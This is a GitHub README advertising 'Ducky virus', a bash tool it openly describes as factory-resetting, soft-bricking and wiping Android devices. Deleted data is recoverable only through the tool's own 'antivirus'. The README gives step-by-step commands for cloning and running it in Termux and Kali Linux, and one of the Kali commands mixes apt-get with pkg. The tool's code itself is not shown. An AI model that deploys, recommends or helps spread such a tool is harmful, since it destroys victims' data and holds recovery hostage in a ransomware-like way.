## <p align="center">Ducky virus

<div align="center">
  <img src="duck.gif">
</div>

## About
Simple Bash script program to Factory reset and soft Brick an Android device (Supports Android 10+), however, the data can be recovered ONLY by the Antivirus provided in the program itself.  
  
## Features 
* Factory Reset
* Soft brick
* Software reset
* Data Deletion (recoverable)
 
 ### <p align="center">Deploy in Termux
***
        
 ```bash
pkg update && pkg upgrade -y
```
```bash
pkg install git -y
```
```bash
pkg install lolcat
```
```bash
git clone https://github.com/krishealty/ducky-virus
```
```bash
cd $HOME
```
```bash
cd ducky-virus
```
```bash
ls
```
```bash
bash main.sh
```

### <p align="center">Deploy in Kali Linux
***
 ```bash
sudo apt-get update && pkg upgrade -y
```
```bash
sudo apt-get install git -y
```
```bash
git clone https://github.com/krishealty/ducky-virus
```
```bash
cd ducky-virus
```
```bash
bash main.sh
```

## ScreenShots :- 
  ![Screenshot_20220613-103741_zoom](https://user-images.githubusercontent.com/70594016/173283913-54b6a34b-e3e8-4d9e-a906-56dc08ffc44e.png)
